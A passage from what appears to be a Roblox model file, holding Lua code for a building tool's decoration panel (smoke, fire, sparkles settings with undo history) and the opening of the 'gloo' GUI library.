		self.GUI.Sparkles:TweenPosition( UDim2.new( 0, 10, 0, 90 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
	if not self.State.smoke_open and not self.State.sparkles_open then
		self.GUI:TweenSize( UDim2.new( 0, 200, 0, 125 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
end;

Tools.Decorate.closeSparkles = function ( self )
	self.State.sparkles_open = false;
	if self.State.smoke_open or self.State.fire_open then
		self.GUI.Sparkles:TweenPosition( UDim2.new( 0, 10, 0, 200 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	else
		self.GUI.Sparkles:TweenPosition( UDim2.new( 0, 10, 0, 90 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
	self.GUI.Sparkles.Options:TweenSize( UDim2.new( 1, -3, 0, 0 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	if not self.State.smoke_open and not self.State.fire_open then
		self.GUI:TweenSize( UDim2.new( 0, 200, 0, 125 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
end;

Tools.Decorate.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then
		local Container = Tool.Interfaces.BTDecorateToolGUI:Clone();
		Container.Parent = UI;

		Container.Smoke.ArrowButton.MouseButton1Up:connect( function ()
			if not self.State.smoke_open and #self:getSmoke() > 0 then
				self:openSmoke();
			else
				self:closeSmoke();
			end;
		end );
		Container.Fire.ArrowButton.MouseButton1Up:connect( function ()
			if not self.State.fire_open and #self:getFire() > 0 then
				self:openFire();
			else
				self:closeFire();
			end;
		end );
		Container.Sparkles.ArrowButton.MouseButton1Up:connect( function ()
			if not self.State.sparkles_open and #self:getSparkles() > 0 then
				self:openSparkles();
			else
				self:closeSparkles();
			end;
		end );

		Container.Smoke.AddButton.MouseButton1Up:connect( function ()
			self:addSmoke();
			self:openSmoke();
		end );
		Container.Fire.AddButton.MouseButton1Up:connect( function ()
			self:addFire();
			self:openFire();
		end );
		Container.Sparkles.AddButton.MouseButton1Up:connect( function ()
			self:addSparkles();
			self:openSparkles();
		end );
		Container.Smoke.RemoveButton.MouseButton1Up:connect( function ()
			self:removeSmoke()
			self:closeSmoke();
		end );
		Container.Fire.RemoveButton.MouseButton1Up:connect( function ()
			self:removeFire();
			self:closeFire();
		end );
		Container.Sparkles.RemoveButton.MouseButton1Up:connect( function ()
			self:removeSparkles();
			self:closeSparkles();
		end );

		-- Add functionality to smoke inputs
		local SmokeUI = Container.Smoke;

		local SmokeColor = SmokeUI.Options.ColorOption;
		SmokeColor.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.smoke_color_r_focused = true;
			SmokeColor.RInput.TextBox:CaptureFocus();
		end );
		SmokeColor.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SmokeColor.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSmokeColor( 'r', potential_new / 255 );
			end;
			self.State.smoke_color_r_focused = false;
		end );
		SmokeColor.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.smoke_color_g_focused = true;
			SmokeColor.GInput.TextBox:CaptureFocus();
		end );
		SmokeColor.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SmokeColor.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSmokeColor( 'g', potential_new / 255 );
			end;
			self.State.smoke_color_g_focused = false;
		end );
		SmokeColor.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.smoke_color_b_focused = true;
			SmokeColor.BInput.TextBox:CaptureFocus();
		end );
		SmokeColor.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SmokeColor.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSmokeColor( 'b', potential_new / 255 );
			end;
			self.State.smoke_color_b_focused = false;
		end );

		SmokeColor.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the smoke's color
				-- to the selected color
				if #args == 3 then
					self:changeSmokeColor( _HSVToRGB( ... ) );
				end;
			end, self.State.smoke_color );
		end );

		local SmokeOpacity = SmokeUI.Options.OpacityOption.Input;
		SmokeOpacity.TextButton.MouseButton1Down:connect( function ()
			self.State.smoke_opacity_focused = true;
			SmokeOpacity.TextBox:CaptureFocus();
		end );
		SmokeOpacity.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SmokeOpacity.TextBox.Text );
			if potential_new then
				if potential_new > 1 then
					potential_new = 1;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSmokeOpacity( potential_new );
			end;
			self.State.smoke_opacity_focused = false;
		end );

		local SmokeVelocity = SmokeUI.Options.VelocityOption.Input;
		SmokeVelocity.TextButton.MouseButton1Down:connect( function ()
			self.State.smoke_velocity_focused = true;
			SmokeVelocity.TextBox:CaptureFocus();
		end );
		SmokeVelocity.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SmokeVelocity.TextBox.Text );
			if potential_new then
				if potential_new > 25 then
					potential_new = 25;
				elseif potential_new < -25 then
					potential_new = -25;
				end;
				self:changeSmokeVelocity( potential_new );
			end;
			self.State.smoke_velocity_focused = false;
		end );

		local SmokeSize = SmokeUI.Options.SizeOption.Input;
		SmokeSize.TextButton.MouseButton1Down:connect( function ()
			self.State.smoke_size_focused = true;
			SmokeSize.TextBox:CaptureFocus();
		end );
		SmokeSize.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SmokeSize.TextBox.Text );
			if potential_new then
				if potential_new > 100 then
					potential_new = 100;
				elseif potential_new < 0.1 then
					potential_new = 0.1;
				end;
				self:changeSmokeSize( potential_new );
			end;
			self.State.smoke_size_focused = false;
		end );

		-- Add functionality to fire inputs
		local FireUI = Container.Fire;

		local FireColor = FireUI.Options.ColorOption;
		FireColor.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_color_r_focused = true;
			FireColor.RInput.TextBox:CaptureFocus();
		end );
		FireColor.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireColor.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeFireColor( 'r', potential_new / 255 );
			end;
			self.State.fire_color_r_focused = false;
		end );
		FireColor.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_color_g_focused = true;
			FireColor.GInput.TextBox:CaptureFocus();
		end );
		FireColor.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireColor.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeFireColor( 'g', potential_new / 255 );
			end;
			self.State.fire_color_g_focused = false;
		end );
		FireColor.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_color_b_focused = true;
			FireColor.BInput.TextBox:CaptureFocus();
		end );
		FireColor.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireColor.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeFireColor( 'b', potential_new / 255 );
			end;
			self.State.fire_color_b_focused = false;
		end );
		FireColor.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the fire's color
				-- to the selected color
				if #args == 3 then
					self:changeFireColor( _HSVToRGB( ... ) );
				end;
			end, self.State.fire_color );
		end );

		local FireColor2 = FireUI.Options.SecondColorOption;
		FireColor2.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_2nd_color_r_focused = true;
			FireColor2.RInput.TextBox:CaptureFocus();
		end );
		FireColor2.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireColor2.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeFireColor2( 'r', potential_new / 255 );
			end;
			self.State.fire_2nd_color_r_focused = false;
		end );
		FireColor2.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_2nd_color_g_focused = true;
			FireColor2.GInput.TextBox:CaptureFocus();
		end );
		FireColor2.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireColor2.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeFireColor2( 'g', potential_new / 255 );
			end;
			self.State.fire_2nd_color_g_focused = false;
		end );
		FireColor2.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_2nd_color_b_focused = true;
			FireColor2.BInput.TextBox:CaptureFocus();
		end );
		FireColor2.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireColor2.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeFireColor2( 'b', potential_new / 255 );
			end;
			self.State.fire_2nd_color_b_focused = false;
		end );
		FireColor2.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the fire's secondary color
				-- to the selected color
				if #args == 3 then
					self:changeFireColor2( _HSVToRGB( ... ) );
				end;
			end, self.State.fire_2nd_color );
		end );

		local FireHeat = FireUI.Options.HeatOption.Input;
		FireHeat.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_heat_focused = true;
			FireHeat.TextBox:CaptureFocus();
		end );
		FireHeat.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireHeat.TextBox.Text );
			if potential_new then
				if potential_new > 25 then
					potential_new = 25;
				elseif potential_new < -25 then
					potential_new = -25;
				end;
				self:changeFireHeat( potential_new );
			end;
			self.State.fire_heat_focused = false;
		end );

		local FireSize = FireUI.Options.SizeOption.Input;
		FireSize.TextButton.MouseButton1Down:connect( function ()
			self.State.fire_size_focused = true;
			FireSize.TextBox:CaptureFocus();
		end );
		FireSize.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( FireSize.TextBox.Text );
			if potential_new then
				if potential_new > 30 then
					potential_new = 30;
				elseif potential_new < 2 then
					potential_new = 2;
				end;
				self:changeFireSize( potential_new );
			end;
			self.State.fire_size_focused = false;
		end );

		-- Add functionality to sparkles inputs
		local SparklesUI = Container.Sparkles;

		local SparklesColor = SparklesUI.Options.ColorOption;
		SparklesColor.RInput.TextButton.MouseButton1Down:connect( function ()
			self.State.sparkles_color_r_focused = true;
			SparklesColor.RInput.TextBox:CaptureFocus();
		end );
		SparklesColor.RInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SparklesColor.RInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSparklesColor( 'r', potential_new / 255 );
			end;
			self.State.sparkles_color_r_focused = false;
		end );
		SparklesColor.GInput.TextButton.MouseButton1Down:connect( function ()
			self.State.sparkles_color_g_focused = true;
			SparklesColor.GInput.TextBox:CaptureFocus();
		end );
		SparklesColor.GInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SparklesColor.GInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSparklesColor( 'g', potential_new / 255 );
			end;
			self.State.sparkles_color_g_focused = false;
		end );
		SparklesColor.BInput.TextButton.MouseButton1Down:connect( function ()
			self.State.sparkles_color_b_focused = true;
			SparklesColor.BInput.TextBox:CaptureFocus();
		end );
		SparklesColor.BInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( SparklesColor.BInput.TextBox.Text );
			if potential_new then
				if potential_new > 255 then
					potential_new = 255;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeSparklesColor( 'b', potential_new / 255 );
			end;
			self.State.sparkles_color_b_focused = false;
		end );
		SparklesColor.HSVPicker.MouseButton1Up:connect( function ()
			ColorPicker:start( function ( ... )
				local args = { ... };
				-- If a color was picked, change the sparkles' color
				-- to the selected color
				if #args == 3 then
					self:changeSparklesColor( _HSVToRGB( ... ) );
				end;
			end, self.State.sparkles_color );
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Decorate.changeSmokeOpacity = function ( self, new_opacity )

	local smoke = self:getSmoke();

	self:startHistoryRecord( smoke );
	for _, Smoke in pairs( smoke ) do
		Smoke.Opacity = new_opacity;
	end;
	self:finishHistoryRecord();

end;

Tools.Decorate.changeSmokeVelocity = function ( self, new_velocity )

	local smoke = self:getSmoke();

	self:startHistoryRecord( smoke );
	for _, Smoke in pairs( smoke ) do
		Smoke.RiseVelocity = new_velocity;
	end;
	self:finishHistoryRecord();

end;

Tools.Decorate.changeSmokeSize = function ( self, new_size )

	local smoke = self:getSmoke();

	self:startHistoryRecord( smoke );
	for _, Smoke in pairs( smoke ) do
		Smoke.Size = new_size;
	end;
	self:finishHistoryRecord();

end;

Tools.Decorate.changeFireHeat = function ( self, new_velocity )

	local fire = self:getFire();

	self:startHistoryRecord( fire );
	for _, Fire in pairs( fire ) do
		Fire.Heat = new_velocity;
	end;
	self:finishHistoryRecord();

end;

Tools.Decorate.changeFireSize = function ( self, new_size )

	local fire = self:getFire();

	self:startHistoryRecord( fire );
	for _, Fire in pairs( fire ) do
		Fire.Size = new_size;
	end;
	self:finishHistoryRecord();

end;

Tools.Decorate.getSmoke = function ( self )
	-- Returns a list of all the relevant smoke in the selection items

	local smoke = {};

	for _, Item in pairs( Selection.Items ) do
		local Smoke = _getChildOfClass( Item, 'Smoke' );
		if Smoke then
			table.insert( smoke, Smoke );
		end;
	end;

	return smoke;

end;

Tools.Decorate.getFire = function ( self )
	-- Returns a list of all the relevant fire in the selection items

	local fire = {};

	for _, Item in pairs( Selection.Items ) do
		local Fire = _getChildOfClass( Item, 'Fire' );
		if Fire then
			table.insert( fire, Fire );
		end;
	end;

	return fire;

end;

Tools.Decorate.getSparkles = function ( self )
	-- Returns a list of all the relevant sparkles in the selection items

	local sparkles = {};

	for _, Item in pairs( Selection.Items ) do
		local Sparkles = _getChildOfClass( Item, 'Sparkles' );
		if Sparkles then
			table.insert( sparkles, Sparkles );
		end;
	end;

	return sparkles;

end;

Tools.Decorate.changeSmokeColor = function ( self, ... )

	local args = { ... };
	local targets = self:getSmoke();

	self:startHistoryRecord( targets );

	-- If only one component is being changed at a time
	if #args == 2 then
		local component = args[1];
		local component_value = args[2];

		for _, Smoke in pairs( targets ) do
			Smoke.Color = Color3.new(
				component == 'r' and component_value or Smoke.Color.r,
				component == 'g' and component_value or Smoke.Color.g,
				component == 'b' and component_value or Smoke.Color.b
			);
		end;

	-- If all 3 components of the color are being changed
	elseif #args == 3 then
		local r, g, b = ...;

		for _, Smoke in pairs( targets ) do
			Smoke.Color = Color3.new( r, g, b );
		end;
	end;

	self:finishHistoryRecord();
end;

Tools.Decorate.changeFireColor = function ( self, ... )

	local args = { ... };
	local targets = self:getFire();

	self:startHistoryRecord( targets );

	-- If only one component is being changed at a time
	if #args == 2 then
		local component = args[1];
		local component_value = args[2];

		for _, Fire in pairs( targets ) do
			Fire.Color = Color3.new(
				component == 'r' and component_value or Fire.Color.r,
				component == 'g' and component_value or Fire.Color.g,
				component == 'b' and component_value or Fire.Color.b
			);
		end;

	-- If all 3 components of the color are being changed
	elseif #args == 3 then
		local r, g, b = ...;

		for _, Fire in pairs( targets ) do
			Fire.Color = Color3.new( r, g, b );
		end;
	end;

	self:finishHistoryRecord();
end;

Tools.Decorate.changeFireColor2 = function ( self, ... )

	local args = { ... };
	local targets = self:getFire();

	self:startHistoryRecord( targets );

	-- If only one component is being changed at a time
	if #args == 2 then
		local component = args[1];
		local component_value = args[2];

		for _, Fire in pairs( targets ) do
			Fire.SecondaryColor = Color3.new(
				component == 'r' and component_value or Fire.Color.r,
				component == 'g' and component_value or Fire.Color.g,
				component == 'b' and component_value or Fire.Color.b
			);
		end;

	-- If all 3 components of the color are being changed
	elseif #args == 3 then
		local r, g, b = ...;

		for _, Fire in pairs( targets ) do
			Fire.SecondaryColor = Color3.new( r, g, b );
		end;
	end;

	self:finishHistoryRecord();
end;

Tools.Decorate.changeSparklesColor = function ( self, ... )

	local args = { ... };
	local targets = self:getSparkles();

	self:startHistoryRecord( targets );

	-- If only one component is being changed at a time
	if #args == 2 then
		local component = args[1];
		local component_value = args[2];

		for _, Sparkles in pairs( targets ) do
			Sparkles.SparkleColor = Color3.new(
				component == 'r' and component_value or Sparkles.SparkleColor.r,
				component == 'g' and component_value or Sparkles.SparkleColor.g,
				component == 'b' and component_value or Sparkles.SparkleColor.b
			);
		end;

	-- If all 3 components of the color are being changed
	elseif #args == 3 then
		local r, g, b = ...;

		for _, Sparkles in pairs( targets ) do
			Sparkles.SparkleColor = Color3.new( r, g, b );
		end;
	end;

	self:finishHistoryRecord();
end;

Tools.Decorate.addSmoke = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Smoke in pairs( self.smoke ) do
				Smoke.Parent = self.smoke_parents[Smoke];
				Selection:add( Smoke.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Smoke in pairs( self.smoke ) do
				Selection:add( Smoke.Parent );
				Smoke.Parent = nil;
			end;
		end;
	};

	-- Add smoke to all the items from the selection that
	-- don't already have smoke
	local smoke = {};
	local smoke_parents = {};
	for _, Item in pairs( Selection.Items ) do
		local Smoke = _getChildOfClass( Item, 'Smoke' );
		if not Smoke then
			local Smoke = RbxUtility.Create( 'Smoke' ) {
				Parent = Item;
			};
			table.insert( smoke, Smoke );
			smoke_parents[Smoke] = Item;
		end;
	end;

	HistoryRecord.smoke = smoke;
	HistoryRecord.smoke_parents = smoke_parents;
	History:add( HistoryRecord );

end;

Tools.Decorate.removeSmoke = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Smoke in pairs( self.smoke ) do
				Selection:add( Smoke.Parent );
				Smoke.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Smoke in pairs( self.smoke ) do
				Smoke.Parent = self.smoke_parents[Smoke];
				Selection:add( Smoke.Parent );
			end;
		end;
	};

	local smoke = self:getSmoke();
	local smoke_parents = {};

	-- Remove smoke from all the selected items
	for _, Smoke in pairs( smoke ) do
		smoke_parents[Smoke] = Smoke.Parent;
		Smoke.Parent = nil;
	end;

	HistoryRecord.smoke = smoke;
	HistoryRecord.smoke_parents = smoke_parents;
	History:add( HistoryRecord );

end;

Tools.Decorate.addFire = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Fire in pairs( self.fire ) do
				Fire.Parent = self.fire_parents[Fire];
				Selection:add( Fire.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Fire in pairs( self.fire ) do
				Selection:add( Fire.Parent );
				Fire.Parent = nil;
			end;
		end;
	};

	-- Add fire to all the items from the selection that
	-- don't already have fire
	local fire = {};
	local fire_parents = {};
	for _, Item in pairs( Selection.Items ) do
		local Fire = _getChildOfClass( Item, 'Fire' );
		if not Fire then
			local Fire = RbxUtility.Create( 'Fire' ) {
				Parent = Item;
			};
			table.insert( fire, Fire );
			fire_parents[Fire] = Item;
		end;
	end;

	HistoryRecord.fire = fire;
	HistoryRecord.fire_parents = fire_parents;
	History:add( HistoryRecord );

end;

Tools.Decorate.removeFire = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Fire in pairs( self.fire ) do
				Selection:add( Fire.Parent );
				Fire.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Fire in pairs( self.fire ) do
				Fire.Parent = self.fire_parents[Fire];
				Selection:add( Fire.Parent );
			end;
		end;
	};

	local fire = self:getFire();
	local fire_parents = {};

	-- Remove fire from all the selected items
	for _, Fire in pairs( fire ) do
		fire_parents[Fire] = Fire.Parent;
		Fire.Parent = nil;
	end;

	HistoryRecord.fire = fire;
	HistoryRecord.fire_parents = fire_parents;
	History:add( HistoryRecord );

end;

Tools.Decorate.addSparkles = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Sparkles in pairs( self.sparkles ) do
				Sparkles.Parent = self.sparkles_parents[Sparkles];
				Selection:add( Sparkles.Parent );
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Sparkles in pairs( self.sparkles ) do
				Selection:add( Sparkles.Parent );
				Sparkles.Parent = nil;
			end;
		end;
	};

	-- Add sparkles to all the items from the selection that
	-- don't already have sparkles
	local sparkles = {};
	local sparkles_parents = {};
	for _, Item in pairs( Selection.Items ) do
		local Sparkles = _getChildOfClass( Item, 'Sparkles' );
		if not Sparkles then
			local Sparkles = RbxUtility.Create( 'Sparkles' ) {
				Parent = Item;
				SparkleColor = Color3.new( 1, 0, 0 );
			};
			table.insert( sparkles, Sparkles );
			sparkles_parents[Sparkles] = Item;
		end;
	end;

	HistoryRecord.sparkles = sparkles;
	HistoryRecord.sparkles_parents = sparkles_parents;
	History:add( HistoryRecord );

end;

Tools.Decorate.removeSparkles = function ( self )

	local HistoryRecord = {
		apply = function ( self )
			Selection:clear();
			for _, Sparkles in pairs( self.sparkles ) do
				Selection:add( Sparkles.Parent );
				Sparkles.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Sparkles in pairs( self.sparkles ) do
				Sparkles.Parent = self.sparkles_parents[Sparkles];
				Selection:add( Sparkles.Parent );
			end;
		end;
	};

	local sparkles = self:getSparkles();
	local sparkles_parents = {};

	-- Remove fire from all the selected items
	for _, Sparkles in pairs( sparkles ) do
		sparkles_parents[Sparkles] = Sparkles.Parent;
		Sparkles.Parent = nil;
	end;

	HistoryRecord.sparkles = sparkles;
	HistoryRecord.sparkles_parents = sparkles_parents;
	History:add( HistoryRecord );

end;

Tools.Decorate.startHistoryRecord = function ( self, decorations )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( decorations );
		initial_color = {};			terminal_color = {};
		initial_2nd_color = {};		terminal_2nd_color = {};
		initial_opacity = {};		terminal_opacity = {};
		initial_velocity = {};		terminal_velocity = {};
		initial_size = {};			terminal_size = {};
		initial_heat = {};			terminal_heat = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					if Target:IsA( 'Sparkles' ) then
						Target.SparkleColor = self.initial_color[Target];
					else
						Target.Color = self.initial_color[Target];
						Target.Size = self.initial_size[Target];
					end;
					if Target:IsA( 'Smoke' ) then
						Target.Opacity = self.initial_opacity[Target];
						Target.RiseVelocity = self.initial_velocity[Target];
					end;
					if Target:IsA( 'Fire' ) then
						Target.SecondaryColor = self.initial_2nd_color[Target];
						Target.Heat = self.initial_heat[Target];
					end;
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Selection:add( Target.Parent );
					if Target:IsA( 'Sparkles' ) then
						Target.SparkleColor = self.terminal_color[Target];
					else
						Target.Color = self.terminal_color[Target];
						Target.Size = self.terminal_size[Target];
					end;
					if Target:IsA( 'Smoke' ) then
						Target.Opacity = self.terminal_opacity[Target];
						Target.RiseVelocity = self.terminal_velocity[Target];
					end;
					if Target:IsA( 'Fire' ) then
						Target.SecondaryColor = self.terminal_2nd_color[Target];
						Target.Heat = self.terminal_heat[Target];
					end;
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			if Item:IsA( 'Sparkles' ) then
				self.State.HistoryRecord.initial_color[Item] = Item.SparkleColor;
			else
				self.State.HistoryRecord.initial_color[Item] = Item.Color;
				self.State.HistoryRecord.initial_size[Item] = Item.Size;
			end;
			if Item:IsA( 'Smoke' ) then
				self.State.HistoryRecord.initial_opacity[Item] = Item.Opacity;
				self.State.HistoryRecord.initial_velocity[Item] = Item.RiseVelocity;
			end;
			if Item:IsA( 'Fire' ) then
				self.State.HistoryRecord.initial_2nd_color[Item] = Item.SecondaryColor;
				self.State.HistoryRecord.initial_heat[Item] = Item.Heat;
			end;
		end;
	end;

end;

Tools.Decorate.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			if Item:IsA( 'Sparkles' ) then
				self.State.HistoryRecord.terminal_color[Item] = Item.SparkleColor;
			else
				self.State.HistoryRecord.terminal_color[Item] = Item.Color;
				self.State.HistoryRecord.terminal_size[Item] = Item.Size;
			end;
			if Item:IsA( 'Smoke' ) then
				self.State.HistoryRecord.terminal_opacity[Item] = Item.Opacity;
				self.State.HistoryRecord.terminal_velocity[Item] = Item.RiseVelocity;
			end;
			if Item:IsA( 'Fire' ) then
				self.State.HistoryRecord.terminal_2nd_color[Item] = Item.SecondaryColor;
				self.State.HistoryRecord.terminal_heat[Item] = Item.Heat;
			end;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Decorate.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Decorate.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
					</Item>
					<Item class="LocalScript" referent="RBXC97DEC42780A458EA3479D51F9DA1B86">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">gloo by Anaminus</string>
							<string name="ScriptGuid"></string>
							<ProtectedString name="Source"><![CDATA[local PROJECT_NAME = "gloo"

if _G[PROJECT_NAME] then return end

---- SETTINGS
local ENTRY_SIZE	= 17	-- default size of rows, scrollbars, etc
local WEAK_TABLES	= false	-- whether weak tables are enabled (causes problems under certain circumstances)
----/SETTINGS

local lib = {}
local doc = {}
local version = "0.11"

doc["Version"] = [==[
Version ( ) [function]
	returns: string `version`

Returns the current version of the library (currently ]==]..version..[==[).
]==]

function lib.Version()
	return version
end

doc["NULL"] = [==[
NULL [const]

Represents a "non-nil nil value". Used with tables that need a way to declare an entry as nil while still being defined in the table.
]==]

local NULL = {}
lib.NULL = NULL

local SORT = {
	NONE = 0;
	ASCENDING = 1;
	DESCENDING = 2;
}
lib.SORT = SORT

local WEAK_MODE = {
	K = {__mode="k"};
	V = {__mode="v"};
	KV = {__mode="kv"};
}

local function GetIndex(table,value)
	for i,v in pairs(table) do
		if v == value then
			return i
		end
	end
end

local function ClampIndex(table,index)
	local max = #table
	index = math.floor(index)
	return index < 1 and 1 or index > max and max or index
end

local function Create(ty)
	return function(data)
		local obj = Instance.new(ty)
		for k, v in pairs(data) do
			if type(k) == 'number' then
				v.Parent = obj
			else
				obj[k] = v
			end
		end
		return obj
	end
end

local function Modify(obj)
	return function(data)
		for k, v in pairs(data) do
			if type(k) == 'number' then
				v.Parent = obj
			else
				obj[k] = v
			end
		end
		return obj
	end
end

--[[
local ENUM_MT = {
	__tostring = function(e)
		return "enum: "..e.__type
	end;
}

local function CastToEnum(value,enum)
	if value ~= '__type' then
		for k,e in pairs(enum) do
			if k == value then
				return e
			end
		end
	end
	error('cannot cast `'..tostring(value)..'` to enum '..enum.__type,3)
end
--]]

--[[DEPEND:]]

doc["SetZIndex"] = [==[
SetZIndex ( Instance `object`, number `zindex` ) [function]
	returns: (nothing)

Sets the ZIndex of `object`, then calls SetZIndex on every child of `object`.

Arguments:
	`object`
		The instance to set the ZIndex of.
	`zindex`
		The ZIndex to set the object to.
]==]

doc["SetZIndexOnChanged"] = [==[
SetZIndexOnChanged ( Instance `object` )
	returns: RBXScriptConnection `connection`

Sets an object to call SetZIndex whenever its ZIndex changes.

Arguments:
	`object`
		The instance to set.

Returns:
	`connection`
		The resulting event connection.
]==]

local ZIndexLock = {}
local function SetZIndex(object,z)
	if not ZIndexLock[object] then
		ZIndexLock[object] = true
		object.ZIndex = z
		for _,child in pairs(object:GetChildren()) do
			SetZIndex(child,z)
		end
		ZIndexLock[object] = nil
	end
end

local function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end

lib.SetZIndex = SetZIndex
lib.SetZIndexOnChanged = SetZIndexOnChanged

--[[DEPEND:]]

doc["GetScreen"] = [==[
GetScreen ( Instance `object` ) [function]
	returns ScreenGui `screen`

Gets the nearest ascending ScreenGui of `object`.
Returns `object` if it is a ScreenGui.
Returns nil if `object` isn't the descendant of a ScreenGui.

Arguments:
	`object`
		The instance to get the ascending ScreenGui from.

Returns:
	`screen`
		The ascending screen.
		Will be nil if `object` isn't the descendant of a ScreenGui.
]==]

local function GetScreen(object)
	local screen = object
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end

lib.GetScreen = GetScreen

--[[DEPEND:]]

doc["GetPadding"] = [==[
GetPadding ( GuiObject `object` ) [function]
	returns: number `padding`

